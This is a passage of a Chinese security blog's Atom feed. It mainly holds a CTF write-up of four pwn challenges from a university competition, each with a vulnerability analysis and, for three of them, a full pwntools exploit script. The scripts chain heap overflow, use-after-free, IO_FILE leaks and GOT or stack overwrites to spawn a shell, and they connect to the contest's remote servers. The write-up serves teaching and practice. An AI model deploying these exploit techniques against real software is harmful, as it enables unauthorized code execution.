+p9+X8kS62NHt4Sv8aSn007Y2C9I487lcMWf3pH0YYXn3OqstmJwVrAZlqQJN4kbdUHsochHdBZXBlN3dn4PpZw/bEmcy6aBjaA6zTh9OwDN2cPC2RYr8otnmbZyfwyiu0INQ51zHGCGto/cTVcCCf/7osjMfqVSz7YrDRyzjPRR7gzU3vfu3eUEGCNuaJDvyqiBy9zvLfxKFfiwBYnAucOTPckC2V0tn/QKTOOP5I3n4a9Lt/CMQgCT8+Ah5BpHD4oJnn87IaHMa0sRNf40UiJUBtYhzA7raKMs7u2TpeurH626YG6Mob5VjFS3vNQ6Q6ijUFxRwORr87To+191anMaOhwP9WdRZYTKCw7cHs1K3hz5PsIFSlRmo8O6yOoSINo0N6iHeJ9BZFXhi4QGw95mLZVX4foWRV74zkyeLNITejRVpiqrqoNae7X50k0nRY0xi+iuQSjpqdStgznR5DKyO+o0D7WNxWLkMvdh7Zl509+UD1vZet6Ih8j20DWY381OQPNmQhylrLJoP4bZeDjUbqdBK2obV9lgJSSJCSR2sef96CaAISAAn1J7sHMTx058fyohGRrsOkefqIcpMy68ar8XxRHzmc/XZIOJzmjPkO+MKg5TIEFC7eR1DVvqQ/nCXBY41cT+3T4m7KepAxT2uD52HnXFOJygg4gDDvwk9cvuzluBU6qlALj+kcn7N5kaq0NFCtcNZMDvUpRDrYAhXB/Niu9iRwPNuvirT/XXpx+buaq1970sh9jP00WgDxz71vo2VKDvNZxuYZ1+ONEqYcFubkExA2yacEEfZEyDuZKHZvgpGrEtHHYsNNJxJi1VVUluwCYLxGZzjHLPFGMpXbevkzvtVMkcpckRD6zn7Cti+4BIJv+jxcb7w7L1CIZXv4joDbkE+D1yo3kOFuex3ZdcXGlj1mbNOoJt6Z01RcWe0VEiHTP9Ur6pS0DYJCoyIIcmixzlhagSfyGfwgEW3mGw6du4FH3Ss9JpXyrT9EK55jsilocdLvulCtxGQmzTr3gihCQqiZQeIFb7L2t3nxK1zYuxX9UFkeqNyoe8gBII/0tvqsc0rGVCvsFna0Nza+mQOooeAF5nPOcL4t3TdNiSiab4IqI7bgwfy2Hc7UZm/49Q== </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-04-15T06:35:24.169Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
